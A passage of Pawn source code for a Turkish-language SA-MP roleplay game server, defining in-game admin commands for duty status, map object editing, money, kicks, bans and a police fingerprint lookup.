				SetPVarString(playerid, "TempNameName", username);

 		    	AdminDuty[playerid] = 1;
 		    	format(string, sizeof(string), "%s (ID %d - %s) Level %d admin olarak iþbaþý yaptý.",PlayerInfo[playerid][pAdminName], playerid, GetPlayerNameEx(playerid), PlayerInfo[playerid][pAdmin]);
 		    	ABroadCast(COLOR_WHITE, string, 1);
				PlayerInfo[playerid][pmka] = 1;
 		    	SendClientMessage(playerid, COLOR_YELLOW, "Artýk iþbaþýnda bir adminsin, levelinin yettiði tüm komutlara eriþimin var,  /ah.");

				SetPlayerName(playerid, PlayerInfo[playerid][pAdminName]);
 			}
		}
		else SendClientMessage(playerid, COLOR_WHITE, "Ýþbaþý yapmak için bir admin ismine ihtiyacýn var, A5+ adminlere danýþ.");
	}
	else SendClientMessage(playerid, COLOR_GRAD1, "Bu komutu kullanma yetkiniz yok!");
	return 1;
}

CMD:adminler(playerid, params[])
{
	SendClientMessage(playerid, COLOR_ORANGE,"Online Yöneticiler");
	for(new i=0;i<MAX_PLAYERS;i++)
	{
		if(IsPlayerConnected(i))
		{
			if(PlayerInfo[i][pAdmin] != 0 && PlayerInfo[i][pAdmin] < 11)
			{
				new string[256];
				new name[MAX_PLAYER_NAME];
				GetPlayerName(i,name,sizeof(name));
				if(AdminDuty[i] == 1)
				{
					format(string,sizeof(string),"{FFFFFF}%s (%s) - {48FC64}(Ýþbaþýnda : Evet) - (Müsait)",name, RPALN(i));
					SendClientMessage(playerid,0x33AA33AA,string);
				}
				else if(AdminDuty[i] == 0)
				{
					format(string,sizeof(string),"{FFFFFF}%s (%s) - (Ýþbaþýnda: Hayýr)",PlayerInfo[i][pAdminName], RPALN(i));
					SendClientMessage(playerid,0xFFFFFFFF,string);
				}
			}
		}
	}
	return 1;
}

CMD:objkoy(playerid, params[])
{
	new string[128], object;
	if(PlayerInfo[playerid][pAdmin] < 6) return SendClientMessage(playerid, COLOR_GREY, "You are not authorized to use this command.");
	if(sscanf(params, "i", object)) return SendClientMessage(playerid, COLOR_WHITE, "[Kullaným]: /objkoy [objectid]");

	for(new idx=1; idx<MAX_OBJ; idx++)
	{
	    if(!ObjInfo[idx][oModel])
	    {
	        GetPlayerPos(playerid, ObjInfo[idx][oX], ObjInfo[idx][oY], ObjInfo[idx][oZ]);
  			ObjInfo[idx][oModel] = object;
  			oldoID = ObjInfo[idx][oModel];
  			oldodX = ObjInfo[idx][oX];
  			oldodY = ObjInfo[idx][oY];
  			oldodZ = ObjInfo[idx][oZ];
  			oldodRX = ObjInfo[idx][oRX];
  			oldodRY = ObjInfo[idx][oRY];
  			oldodRZ = ObjInfo[idx][oRZ];
			ObjInfo[idx][oX] = ObjInfo[idx][oX] + 2;
			ObjInfo[idx][oY] = ObjInfo[idx][oY] + 2;
			ObjInfo[idx][oRX] = 0;
			ObjInfo[idx][oRY] = 0;
			ObjInfo[idx][oRZ] = 0;
			// Creating
			ObjInfo[idx][obj] = CreateDynamicObject(ObjInfo[idx][oModel], ObjInfo[idx][oX], ObjInfo[idx][oY], ObjInfo[idx][oZ], ObjInfo[idx][oRX], ObjInfo[idx][oRY], ObjInfo[idx][oRZ]);
			ObjInfo[idx][oText] = CreateDynamic3DTextLabel(string, COLOR_WHITE, ObjInfo[idx][oX], ObjInfo[idx][oY], ObjInfo[idx][oZ], 0);
			Log("logs/bject.log", string);
			SaveObjects();
			idx = MAX_OBJ;
		}
	}
	return 1;
}

CMD:editobj(playerid, params[])
{
	new string[128], idx;
	if(PlayerInfo[playerid][pAdmin] < 6) return SendClientMessage(playerid, COLOR_GREY, "You are not authorized to use this command.");
	if(sscanf(params, "i", idx)) return SendClientMessage(playerid, COLOR_WHITE, "[Kullaným]: /editobj [objectid]");
    if(!ObjInfo[idx][oModel]) return SendClientMessage(playerid, COLOR_GREY, "Invalid object id.");
	oEdit[playerid] = 1;
	oEditID[playerid] = idx;
	GetDynamicObjectPos(ObjInfo[idx][obj], oPos[playerid][0], oPos[playerid][1], oPos[playerid][2]);
	GetDynamicObjectRot(ObjInfo[idx][obj], oRot[playerid][0], oRot[playerid][1], oRot[playerid][2]);
	EditDynamicObject(playerid, ObjInfo[idx][obj]);
    format(string, sizeof(string), " You are now editing object ID %d's position.", idx);
    SendClientMessage(playerid, COLOR_WHITE, string);
    SaveObjects();
	return 1;
}

CMD:duplicateobj(playerid, params[])
{
    new string[128] ,idx;
	if(PlayerInfo[playerid][pAdmin] < 6) return SendClientMessage(playerid, COLOR_GREY, "You are not authorized to use this command.");
	for(idx=1; idx<MAX_OBJ; idx++)
		{
		    if(!ObjInfo[idx][oModel])
		    {
				ObjInfo[idx][oModel] = oldoID;
				ObjInfo[idx][oX] = oldodX;
				ObjInfo[idx][oY] = oldodY;
				ObjInfo[idx][oZ] = oldodZ;
				ObjInfo[idx][oRX] = oldodRX;
				ObjInfo[idx][oRY] = oldodRY;
				ObjInfo[idx][oRZ] = oldodRZ;
				// Creating
				ObjInfo[idx][obj] = CreateDynamicObject(oldoID, oldodX, oldodY, oldodZ, oldodRX, oldodRY, oldodRZ);
				ObjInfo[idx][oText] = CreateDynamic3DTextLabel(string, COLOR_WHITE, oldodX, oldodY, oldodZ, 10);
				Log("logs/objects.log", string);
				SaveObjects();
				idx = MAX_OBJ;
			}
		}
	return 1;
}

CMD:nearobj(playerid, params[])
{
    new string[128];
	if(PlayerInfo[playerid][pAdmin] < 6) return SendClientMessage(playerid, COLOR_GREY, "{FFFFFF}[{FF0000}@{FFFFFF}]  Bu komutu kullanmaya yetkiniz yok!");
    for(new idx=1; idx<MAX_OBJ; idx++)
	{
		if(IsPlayerInRangeOfPoint(playerid, 5, ObjInfo[idx][oX], ObjInfo[idx][oY], ObjInfo[idx][oZ]))
		{
		    format(string, sizeof(string), "Yanýndaki Obje ID: %d - Obje: %d", idx, ObjInfo[idx][oModel]);
		    SendClientMessage(playerid, COLOR_GREEN, string);
		    return 1;
		}
	}
	SendClientMessage(playerid, COLOR_GREY, "Objenin yanýnda deðilsin.");
	return 1;
}

CMD:deleteobj(playerid, params[])
{
	new idx, string[128];
	if(PlayerInfo[playerid][pAdmin] < 6) return SendClientMessage(playerid, COLOR_GREY, "You are not authorized to use this command.");
	if(sscanf(params, "i", idx)) return SendClientMessage(playerid, COLOR_WHITE, "[Usage]: /deleteobj [objid]");
	if(!ObjInfo[idx][oModel]) return SendClientMessage(playerid, COLOR_GREY, "Invalid object id.");
	ObjInfo[idx][oModel] = 0;
	ObjInfo[idx][oX] = 0;
	ObjInfo[idx][oY] = 0;
	ObjInfo[idx][oZ] = 0;
	ObjInfo[idx][oRX] = 0;
	ObjInfo[idx][oRY] = 0;
	ObjInfo[idx][oRZ] = 0;
	DestroyDynamicObject(ObjInfo[idx][obj]);
	DestroyDynamic3DTextLabel(ObjInfo[idx][oText]);
	SaveObjects();
	Log("logs/object.log", string);
	return 1;
}

CMD:mapyardim(playerid, params[])
{
	if(PlayerInfo[playerid][pAdmin] < 6) return SendClientMessage(playerid, COLOR_GREY, "You are not authorized to use this command.");
	SendClientMessage(playerid, COLOR_GREEN, "_____________________________________________________");
	SendClientMessage(playerid, COLOR_RED, "*Trial Mapper: {FFFFFF}/objkoy /editobj /deleteobj /ma");
	SendClientMessage(playerid, COLOR_RED, "*General Mapper: {FFFFFF}/nearobj /duplicateobj /gotoobj");
	SendClientMessage(playerid, COLOR_RED, "*Head Mapper: {FFFFFF}/setmapper /saveobjects");
	SendClientMessage(playerid, COLOR_GREEN, "_____________________________________________________");
	return 1;
}

CMD:gotoobj(playerid, params[])
{
    new idx, string[128];
	if(PlayerInfo[playerid][pAdmin] < 6) return SendClientMessage(playerid, COLOR_GREY, "You are not authorized to use this command.");
	if(sscanf(params, "i", idx)) return SendClientMessage(playerid, COLOR_WHITE, "[Usage]: /gotoobj [objectid]");
	if(!ObjInfo[idx][oModel]) return SendClientMessage(playerid, COLOR_GREY, "Invalid object id.");
	SetPlayerPos(playerid, ObjInfo[idx][oX], ObjInfo[idx][oY], ObjInfo[idx][oZ]);
	format(string, sizeof(string), " You have teleported to object ID %d.", idx);
	SendClientMessage(playerid, COLOR_WHITE, string);
	return 1;
}
//BUNU DUZELTTÝM
CMD:objectid(playerid, params[])
{
	new idx, string[128];
	while(idx < MAX_OBJ)
	{
     	if(PlayerInfo[playerid][pAdmin] < 6) return SendClientMessage(playerid,COLOR_GREY,"You're not authorized to use this command.");
		format(string, sizeof(string), "", idx, ObjInfo[idx][oModel]);
		ObjInfo[idx][oText] = CreateDynamic3DTextLabel(string, COLOR_WHITE, ObjInfo[idx][oX], ObjInfo[idx][oY], ObjInfo[idx][oZ], 10);
		idx++;
	    }
	return 1;
}

CMD:objectidkapa(playerid, params[])
{
	new idx;
	while(idx < MAX_OBJ)
	{
     	if(PlayerInfo[playerid][pAdmin] < 6) return SendClientMessage(playerid,COLOR_GREY,"You're not authorized to use this command.");
     	DestroyDynamic3DTextLabel(ObjInfo[idx][oText]);
		idx++;
	    }
	return 1;
}

CMD:saveobjects(playerid, params[])
{
   	if(PlayerInfo[playerid][pAdmin] < 6) return SendClientMessage(playerid,COLOR_GREY,"You're not authorized to use this command.");
	SendClientMessage(playerid, COLOR_RED, "Objects have been saved!");
	SaveObjects();
	SaveObjects22();
	return 1;
}

CMD:setweather(playerid, params[])
{
	new string[128], input;
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_GRAD1, "Giriþ yapmadýnýz.");
	if(PlayerInfo[playerid][pAdmin] < 7) return SendClientMessage(playerid, COLOR_GREY, "{FFFFFF}[{FF0000}@{FFFFFF}] Bu komutu kullanma yetkiniz yok!");
	if(sscanf(params, "i", input)) return SendClientMessage(playerid, COLOR_WHITE, "{FFFFFF}[{FF0000}@{FFFFFF}] KULLANIM: /setweather [ID]");
	if(input > 50 || input < 0) return SendClientMessage(playerid, COLOR_GREY, "Invalid Weather ID");
    foreach(Player, i)
    {
        if(IsPlayerConnected(i))
        {
			SetPlayerWeather(i, input);
        }
    }
	format(string, sizeof(string), "AdmWarn:{FFFFFF} %s Havayý Deðiþtirdi , Hava ID %d.", GetPlayerNameEx(playerid), input);
    ABroadCast(COLOR_REPORT,string,1);
	return 1;
}
CMD:helperlar(playerid, params[])
{
	SendClientMessage(playerid, COLOR_GREEN,"**** Online Helperlar ****");
	for(new i=0;i<MAX_PLAYERS;i++)
	{
		if(IsPlayerConnected(i))
		{
			if(PlayerInfo[i][pHelper] != 0 && PlayerInfo[i][pHelper] < 7)
			{
				new string[256];
				new name[MAX_PLAYER_NAME];
				GetPlayerName(i,name,sizeof(name));
				format(string,sizeof(string),"%s || {48FC64}%s", GetPlayerNameEx(i), RPHLN(i));
				SendClientMessage(playerid, 0xFFFFFFFF, string);
			}
		}
	}
	return 1;
}
CMD:savebiz(playerid, params[]) {
    if(PlayerInfo[playerid][pAdmin] >= 6)
	{
		if(AdminDuty[playerid] != 1 && PlayerInfo[playerid][pAdmin] < 6)
	    {
	        SendClientMessage(playerid,COLOR_WHITE, "Admin olarak iþbaþýnda deðilsin. Admin komutlarýna eriþmek için iþbaþý yapman gerekiyor. iþbaþý yapmak için /aduty komutunu kullan.");
			return 1;
	    }
		SaveBiz();
		SendClientMessage(playerid, COLOR_YELLOW, "Tüm Ýþ Yerleri baþarýlý bir þekilde güncellendi.");
    }
    else {
        SendClientMessage(playerid, COLOR_GREY, "{FFFFFF}[{FF0000}@{FFFFFF}] Bu komutu kullanma yetkiniz yok!");
    }
    return 1;
}

CMD:forcesave(playerid, params[]) {
    if(PlayerInfo[playerid][pAdmin] >= 5)
	{
		if(AdminDuty[playerid] != 1 && PlayerInfo[playerid][pAdmin] < 6)
	    {
	        SendClientMessage(playerid,COLOR_WHITE, "Admin olarak iþbaþýnda deðilsin. Admin komutlarýna eriþmek için iþbaþý yapman gerekiyor. iþbaþý yapmak için /aduty komutunu kullan.");
			return 1;
	    }
        SaveHouses();
        SendClientMessage(playerid, COLOR_YELLOW, "Tüm evler baþarýlý bir þekilde güncellendi.");
		foreach(Player, i)
		{
		    if(GetPVarInt(i, "TempName") != 1 && gPlayerLogged[i] && GetPVarInt(i, "PBM") == 0 && GetPVarInt(i, "EventToken") == 0 && AdminDuty[i] == 0)
			{
				PlayerInfo[i][pInt] = GetPlayerInterior(i);
				new Float: fArmour;
				if(GetPVarType(i, "tabbedVW") != 0) {
					PlayerInfo[i][pVW] = GetPVarInt(i, "tabbedVW");
				} else PlayerInfo[i][pVW] = GetPlayerVirtualWorld(i);

				GetPlayerIp(i, PlayerInfo[i][pIP], 32);
				GetPlayerPos(i, PlayerInfo[i][pPos_x], PlayerInfo[i][pPos_y], PlayerInfo[i][pPos_z]);
				GetPlayerFacingAngle(i, PlayerInfo[i][pPos_r]);
				if(GetPlayerArmour(i, fArmour) < ValidArmor[i])	GetPlayerArmour(i, PlayerInfo[i][pArmor]);
				else PlayerInfo[i][pArmor] = ValidArmor[i];
				GetPlayerHealth(i, PlayerInfo[i][pHealth]);
				SaveAccount(i);
			}
		}
        SendClientMessage(playerid, COLOR_YELLOW, "Tüm PlayerInfo baþarýlý bir þekilde güncellendi.");
        SaveFamilies();
        SaveFamiliesHQ();
        SendClientMessage(playerid, COLOR_YELLOW, "Tüm iþyerleri baþarýlý bir þekilde güncellendi.");
        SaveBiz();
        SaveObjects22();
        SaveObjects();
        SendClientMessage(playerid, COLOR_YELLOW, "Tüm aileler baþarýlý bir þekilde güncellendi.");
        UpdatePoints();
        SendClientMessage(playerid, COLOR_YELLOW, "Tüm gateler baþarýlý bir þekilde güncellendi.");
        SaveGates();
        SendClientMessage(playerid, COLOR_YELLOW, "Tüm pointler baþarýlý bir þekilde güncellendi.");
        UpdatePoints();

    }
    else {
        SendClientMessage(playerid, COLOR_GREY, "{FFFFFF}[{FF0000}@{FFFFFF}] Bu komutu kullanma yetkiniz yok!");
    }
    return 1;
}

CMD:givemoney(playerid, params[])
{
	if(PlayerInfo[playerid][pAdmin] >= 9)
	{
		if(AdminDuty[playerid] != 1 && PlayerInfo[playerid][pAdmin] < 6)
	    {
	        SendClientMessage(playerid,COLOR_WHITE, "Admin olarak görevde deðilsin.");
			return 1;
	    }
		new string[128], giveplayerid, money;
		if(sscanf(params, "ud", giveplayerid, money)) return SendClientMessage(playerid, COLOR_WHITE, "KULLANIM: /givemoney [Oyuncu ID/Ýsim] [money]");

		if(IsPlayerConnected(giveplayerid))
		{
			GivePlayerCash(giveplayerid, money);
			format(string, sizeof(string), "%s adlý oyuncuya $%d verdin.",GetPlayerNameEx(giveplayerid),money);
			SendClientMessage(playerid, COLOR_WHITE, string);
			format(string, sizeof(string), "%s, %s adlý kiþiye $%d verdi(/givemoney).", GetPlayerNameEx(playerid), GetPlayerNameEx(giveplayerid),money);
			Log("logs/adminmoney.log", string);
		}
	}
	else
	{
		SendClientMessage(playerid, COLOR_GRAD1, "Bu komutu kullanma yetkiniz yok!");
	}
	return 1;
}

CMD:paintballistatistikleri(playerid, params[]) {
	if(!IsBETAServer())
	    return SendClientMessage(playerid, COLOR_GREY, "Bu beta sunucuda deðil!");

	new string[128], giveplayerid;
	if(sscanf(params, "u", giveplayerid))
	    return SendClientMessage(playerid, COLOR_GREY, "KULLANIM: /paintballistatistikleri [playerid]");

	if(giveplayerid == INVALID_PLAYER_ID)
		return SendClientMessage(playerid, COLOR_GRAD1, "Geçersiz oyuncu.");

	format(string, sizeof(string), "PaintballTakim: %d",PaintballTeam[playerid]);
	SendClientMessage(playerid, COLOR_WHITE, string);

	format(string, sizeof(string), "PBM: %d",GetPVarType(giveplayerid, "PBM"));
	SendClientMessage(playerid, COLOR_WHITE, string);
	new
		Team1Total,
		Team2Total;

	foreach(Player, i) {
		if(GetPVarInt(i, "PBM") == GetPVarInt(giveplayerid, "PBM")) {
			if(PaintballTeam[i] == 1) Team1Total ++;
			else if(PaintballTeam[i] == 2) Team2Total ++;
		}
	}
	format(string, sizeof(string), "Takým1Toplam: %d",Team1Total);
	SendClientMessage(playerid, COLOR_WHITE, string);
	format(string, sizeof(string), "Takým2Toplam: %d",Team2Total);
	SendClientMessage(playerid, COLOR_WHITE, string);
	return 1;
}

CMD:setplayerteam(playerid, params[]) {
	if(!IsBETAServer())
	    return SendClientMessage(playerid, COLOR_GREY, "Bu beta sunucuda deðil!");

	new string[128], giveplayerid, team;
	if(sscanf(params, "ui", giveplayerid, team))
	    return SendClientMessage(playerid, COLOR_GREY, "KULLANIM: /setplayerteam [playerid] [team]");

	if(giveplayerid == INVALID_PLAYER_ID)
		return SendClientMessage(playerid, COLOR_GRAD1, "Geçersiz oyuncu.");

	format(string, sizeof(string), "%s adlý kiþinin takýmýný %d olarak ayarladýn.",GetPlayerNameEx(giveplayerid),team);
	SendClientMessage(playerid, COLOR_WHITE, string);

	format(string, sizeof(string), "%s senin takýmýný %d olarak ayarladý.",GetPlayerNameEx(playerid),team);
	SendClientMessage(giveplayerid, COLOR_WHITE, string);

	SetPlayerTeam(giveplayerid, team);
	return 1;
}

CMD:setmoney(playerid, params[])
{
	if(PlayerInfo[playerid][pAdmin] >= 9)
	{
		if(AdminDuty[playerid] != 1 && PlayerInfo[playerid][pAdmin] < 6)
	    {
	        SendClientMessage(playerid,COLOR_WHITE, "Admin olarak görevde deðilsin.");
			return 1;
	    }
		new string[128], giveplayerid, money;
		if(sscanf(params, "ud", giveplayerid, money)) return SendClientMessage(playerid, COLOR_WHITE, "KULLANIM: /setmoney [Oyuncu ID/Ýsim] [money]");

		if(IsPlayerConnected(giveplayerid))
		{
			ResetPlayerCash(giveplayerid);
			GivePlayerCash(giveplayerid, money);
			format(string, sizeof(string), "%s adlý oyuncunun parasýný $%d olarak deðiþtirdin.",GetPlayerNameEx(giveplayerid),money);
			SendClientMessage(playerid, COLOR_WHITE, string);
			format(string, sizeof(string), "%s, %s adlý oyuncunun parasýný $%d olarak deðiþtirdi. (/setmoney)", GetPlayerNameEx(playerid), GetPlayerNameEx(giveplayerid), money);
			Log("logs/adminmoney.log", string);
		}
	}
	else
	{
		SendClientMessage(playerid, COLOR_GRAD1, "Bu komutu kullanma yetkiniz yok!");
	}
	return 1;
}

CMD:revive(playerid, params[])
{
	if(PlayerInfo[playerid][pAdmin] >= 3)
	{
		if(AdminDuty[playerid] != 1 && PlayerInfo[playerid][pAdmin] < 6)
	    {
	        SendClientMessage(playerid,COLOR_WHITE, "Admin olarak görevde deðilsin.");
			return 1;
	    }

		new string[128], giveplayerid;
		if(sscanf(params, "u", giveplayerid)) return SendClientMessage(playerid, COLOR_WHITE, "KULLANIM: /revive [Oyuncu ID/Ýsim]");

		if(IsPlayerConnected(giveplayerid))
		{
			if(GetPVarInt(giveplayerid, "Injured") == 1)
			{
				format(string, sizeof(string), " %s adlý oyuncuyu canlandýrdýn.", GetPlayerNameEx(giveplayerid));
				SendClientMessage(playerid, COLOR_WHITE, string);
				SendClientMessage(giveplayerid, COLOR_WHITE, "Bir admin tarafýndan canlandýrýldýn.");

				KillEMSQueue(giveplayerid);
   				ClearAnimations(giveplayerid, 1);
   				SetPlayerHealth(giveplayerid, 100);

   				foreach(Player, i) {
   					if(EMSAccepted[i] == giveplayerid) {
   					    format(string, sizeof(string), "%s adlý oyuncu bir admin tarafýndan canlandýrýldý, checkpointin silindi.", GetPlayerNameEx(giveplayerid));
   					    cmd_hedefsifirla(i, "");
					}
   				}
			}
			else
			{
				SendClientMessage(playerid, COLOR_GRAD2, "Bu oyuncu yaralý deðil!");
			}
		}
	}
	else
	{
		SendClientMessage(playerid, COLOR_GRAD1, "Bu komutu kullanma yetkiniz yok!");
	}
	return 1;
}

CMD:hkick(playerid, params[])
{
	if(PlayerInfo[playerid][pHelper] >= 6)
	{
		new string[128], giveplayerid, reason[64];
		if(sscanf(params, "us[64]", giveplayerid, reason)) return SendClientMessage(playerid, COLOR_WHITE, "KULLANIM: /hkick [Oyuncu ID/Ýsim] [sebep]");

		if(IsPlayerConnected(giveplayerid))
		{
			new playerip[32];
			GetPlayerIp(giveplayerid, playerip, sizeof(playerip));
			format(string, sizeof(string), "HelperKomutu: %s (IP:%s) %s tarafýndan kicklendi, sebep: %s", GetPlayerNameEx(giveplayerid), playerip, GetPlayerNameEx(playerid), reason);
			Log("logs/kick.log", string);
			format(string, sizeof(string), "HelperKomutu: %s adlý oyuncu %s tarafýndan kicklendi, sebep: %s", GetPlayerNameEx(giveplayerid), GetPlayerNameEx(playerid), reason);
			SendClientMessageToAllEx(COLOR_LIGHTRED, string);
			Kick(giveplayerid);
			return 1;
		}
		else SendClientMessage(playerid, COLOR_GRAD1, "Geçersiz oyuncu.");
	}
	else SendClientMessage(playerid, COLOR_GRAD1, "Bu komutu kullanma yetkiniz yok!");
	return 1;
}

CMD:kick(playerid, params[])
{
	if(PlayerInfo[playerid][pAdmin] >= 1)
	{
		if(AdminDuty[playerid] != 1 && PlayerInfo[playerid][pAdmin] < 6)
	    {
	        SendClientMessage(playerid,COLOR_WHITE, "Admin olarak görevde deðilsin.");
			return 1;
	    }

		new string[128], giveplayerid, reason[64];
		if(sscanf(params, "us[64]", giveplayerid, reason)) return SendClientMessage(playerid, COLOR_WHITE, "KULLANIM: /kick [Oyuncu ID/Ýsim] [sebep]");

		if(IsPlayerConnected(giveplayerid))
		{
			if(PlayerInfo[giveplayerid][pAdmin] < PlayerInfo[playerid][pAdmin]) {
				new playerip[32];
				GetPlayerIp(giveplayerid, playerip, sizeof(playerip));
				format(string, sizeof(string), "AdminKomutu: %s (IP:%s) %s tarafýndan kicklendi, sebep: %s", GetPlayerNameEx(giveplayerid), playerip, GetPlayerNameEx(playerid), reason);
				Log("logs/kick.log", string);
				format(string, sizeof(string), "AdminKomutu: %s adlý oyuncu %s tarafýndan kicklendi, sebep: %s", GetPlayerNameEx(giveplayerid), GetPlayerNameEx(playerid), reason);
				SendClientMessageToAllEx(COLOR_LIGHTRED, string);
				Kick(giveplayerid);
			}
			return 1;
		} else SendClientMessage(playerid, COLOR_GRAD1, "Geçersiz oyuncu.");
	}
	else SendClientMessage(playerid, COLOR_GRAD1, "Bu komutu kullanma yetkiniz yok!");
	return 1;
}

CMD:skick(playerid, params[])
{
	if(PlayerInfo[playerid][pAdmin] >= 1)
	{
		new string[128], giveplayerid, reason[64];
		if(sscanf(params, "us[64]", giveplayerid, reason)) return SendClientMessage(playerid, COLOR_WHITE, "KULLANIM: /skick [Oyuncu ID/Ýsim] [sebep]");

		if(IsPlayerConnected(giveplayerid))
		{
			if(PlayerInfo[giveplayerid][pAdmin] < PlayerInfo[playerid][pAdmin]) {
				new playerip[32];
				GetPlayerIp(giveplayerid, playerip, sizeof(playerip));
				format(string, sizeof(string), "AdminKomutu: %s(IP:%s) adlý oyuncu %s tarafýndan sessiz olarak kicklendi, sebep: %s", GetPlayerNameEx(giveplayerid), playerip, GetPlayerNameEx(playerid), reason);
				Log("logs/kick.log", string);
				format(string, sizeof(string), "AdminKomutu: %s adlý oyuncu bir admin tarafýndan sessiz olarak kicklendi, sebep: %s", GetPlayerNameEx(giveplayerid), reason);
				ABroadCast(COLOR_LIGHTRED,string,1);
				Kick(giveplayerid);
			}
			return 1;

		}
		else SendClientMessage(playerid, COLOR_GRAD1, "Geçersiz oyuncu.");
	}
	else SendClientMessage(playerid, COLOR_GRAD1, "Bu komutu kullanma yetkiniz yok!");
	return 1;
}

CMD:parmakizi(playerid, params[]) {
	new
	    iTarget,
	    szSex[7],
		szJob[64],
		szJob2[64],
	    szMessage[128];

	if(IsACop(playerid) || PlayerInfo[playerid][pFaction] == 5 && PlayerInfo[playerid][pDivision] == 5 || PlayerInfo[playerid][pFaction] == 5 && PlayerInfo[playerid][pDivision] == 2)  {
		if(sscanf(params, "u", iTarget))
		    return SendClientMessage(playerid, COLOR_GREY, "KULLANIM: /parmakizi [Oyuncu ID/Ýsim]");

		if(!IsPlayerConnected(iTarget))
		    return SendClientMessage(playerid, COLOR_GREY, "Girilen oyuncu oyunda deðil.");

		if(GetDistanceBetweenPlayers(iTarget, playerid) > 5)
		    return SendClientMessage(playerid, COLOR_GREY, "Çok uzaktasýn.");

		if(PlayerCuffed[iTarget] == 0)
			return SendClientMessage(playerid, COLOR_GREY, "Kiþinin parmak izini alabilmek için kelepçeli olmasý gerekiyor.");

		if(PlayerInfo[iTarget][pCrimes] == 0)
		    return SendClientMessage(playerid, COLOR_GREY, "PIV taradýðý parmak izine uygun eþleþme bulamadý.");

		SendClientMessage(playerid, COLOR_GREY, "-----------------------------------------");

		if(PlayerInfo[iTarget][pSex] == 1)
			szSex = "Male";
		else
			szSex = "Female";

		format(szMessage, sizeof(szMessage), "Ýsim: %s (yaþ: %d, cinsiyet: %s)", GetPlayerNameEx(iTarget), PlayerInfo[iTarget][pAge], szSex);
		SendClientMessage(playerid, COLOR_WHITE, szMessage);

		if(PlayerInfo[iTarget][pHouse] != INVALID_HOUSE_ID) {
			new
				szZone[MAX_ZONE_NAME];

			Get2DPosZone(HouseInfo[PlayerInfo[iTarget][pHouse]][hExteriorX], HouseInfo[PlayerInfo[iTarget][pHouse]][hExteriorY], szZone, MAX_ZONE_NAME);
			format(szMessage, sizeof(szMessage), "Ev: %d %s", PlayerInfo[iTarget][pHouse], szZone);
			SendClientMessage(playerid, COLOR_WHITE, szMessage);
		} else if(PlayerInfo[iTarget][pHouse2] != INVALID_HOUSE_ID) {
			new
				szZone[MAX_ZONE_NAME];

			Get2DPosZone(HouseInfo[PlayerInfo[iTarget][pHouse2]][hExteriorX], HouseInfo[PlayerInfo[iTarget][pHouse2]][hExteriorY], szZone, MAX_ZONE_NAME);
			format(szMessage, sizeof(szMessage), "Ev (2): %d %s", PlayerInfo[iTarget][pHouse2], szZone);
			SendClientMessage(playerid, COLOR_WHITE, szMessage);
		}

		format(szMessage, sizeof(szMessage), "Geçmiþ hükümler: %s", PlayerInfo[iTarget][pCrimes]);
		SendClientMessage(playerid, COLOR_WHITE, szMessage);

		format(szMessage, sizeof(szMessage), "Geçmiþ tutuklanmalar: %d", PlayerInfo[iTarget][pArrested]);
		SendClientMessage(playerid, COLOR_WHITE, szMessage);

		switch(PlayerInfo[iTarget][pJob])
		{
			case 1: szJob = "Dedektif";
			case 2: szJob = "Avukat";
			case 7: szJob = "Tamirci";
			case 8: szJob = "Bodyguard";
			case 12: szJob = "Boksör";
			//case 17: szJob = "Taksici";
			case 19: szJob = "Barmen";
			case 20: szJob = "Kamyon Þoförü";
			case 21: szJob = "Pizzacý";
			default: szJob = "Yok";
		}
		switch(PlayerInfo[iTarget][pJob2])
		{
			case 1: szJob2 = "Dedektif";
			case 2: szJob2 = "Avukat";
			case 7: szJob2 = "Tamirci";
			case 8: szJob2 = "Bodyguard";
			case 12: szJob2 = "Boksör";
			//case 17: szJob2 = "Taksici";
			case 19: szJob2 = "Barmen";
			case 20: szJob2 = "Kamyon Þoförü";
			case 21: szJob2 = "Pizzacý";
			default: szJob2 = "Yok";
		}

		format(szMessage, sizeof(szMessage), "Meslek 1: %s - Meslek 2: %s", szJob, szJob2);
		SendClientMessage(playerid, COLOR_WHITE, szMessage);

		SendClientMessage(playerid, COLOR_GREY, "-----------------------------------------");
 	}
	return 1;
}

CMD:ban(playerid, params[]) {
	if(PlayerInfo[playerid][pAdmin] >= 1) {
		if(AdminDuty[playerid] != 1 && PlayerInfo[playerid][pAdmin] < 6)
	    {
	        SendClientMessage(playerid,COLOR_WHITE, "Admin olarak görevde deðilsin.");
			return 1;
	    }
		new string[128], giveplayerid, reason[64];
		if(sscanf(params, "us[64]", giveplayerid, reason)) return SendClientMessage(playerid, COLOR_WHITE, "KULLANIM: /ban [Oyuncu ID/Ýsim] [sebep]");

		if(IsPlayerConnected(giveplayerid)) {
			if(PlayerInfo[giveplayerid][pAdmin] > PlayerInfo[playerid][pAdmin]) {
				if(AdminDuty[playerid] == 1) {
					new username[MAX_PLAYER_NAME];
					GetPVarString(playerid, "TempNameName", username, sizeof(username));
					SetPVarInt(playerid, "TempName", 0);
					SetPlayerName(playerid, username);
				}

				format(string, sizeof(string), "AdminKomutu: %s otomatik olarak banlandý, sebep: Kendinden yüksek level admini banlamaya çalýþmak", PlayerInfo[playerid][pAdminName]);
				ABroadCast(COLOR_YELLOW,string,1);
				punishmentLog(giveplayerid, playerid, 4, string, reason);
				PlayerInfo[playerid][pBanned] = 1;
				new ip[32];
				GetPlayerIp(playerid,ip,sizeof(ip));
				AddBan(ip);
				Kick(playerid);
				return 1;
			} else {
				new playerip[32];
				GetPlayerIp(giveplayerid, playerip, sizeof(playerip));

				if(AdminDuty[giveplayerid] == 1) {
					new username[MAX_PLAYER_NAME];
					GetPVarString(giveplayerid, "TempNameName", username, sizeof(username));
					SetPVarInt(giveplayerid, "TempName", 0);
					SetPlayerName(giveplayerid, username);

					format(string, sizeof(string), "AdminKomutu: %s(IP:%s), %s tarafýndan banlandý, sebep: %s", PlayerInfo[giveplayerid][pAdminName], playerip, GetPlayerNameEx(playerid), reason);
					Log("logs/ban.log", string);
					punishmentLog(giveplayerid, playerid, 4, string, reason);

					format(string, sizeof(string), "AdminKomutu: %s adlý oyuncu % tarafýndan banlandý, sebep: %s", PlayerInfo[giveplayerid][pAdminName], GetPlayerNameEx(playerid), reason);
				} else {
					format(string, sizeof(string), "AdminKomutu: %s(IP:%s), %s tarafýndan banlandý, sebep: %s", GetPlayerNameEx(giveplayerid), playerip, GetPlayerNameEx(playerid), reason);
					Log("logs/ban.log", string);
					punishmentLog(giveplayerid, playerid, 4, string, reason);

					format(string, sizeof(string), "AdminKomutu: %s adlý oyuncu %s tarafýndan banlandý, sebep: %s", GetPlayerNameEx(giveplayerid), GetPlayerNameEx(playerid), reason);
				}

				SendClientMessageToAllEx(COLOR_LIGHTRED, string);
				PlayerInfo[giveplayerid][pBanned] = 1;
